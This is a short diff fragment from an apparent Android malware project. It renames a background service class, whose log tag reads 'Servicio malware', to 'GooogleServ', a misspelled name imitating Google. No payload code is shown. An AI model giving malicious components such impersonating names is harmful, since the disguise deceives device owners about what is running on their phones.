@@ -6,7 +6,7 @@ import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 
-public class AltoSer extends Service {
+public class GooogleServ extends Service {
     private static final String TAG = "Servicio malware";
     private static Malware mal;
 
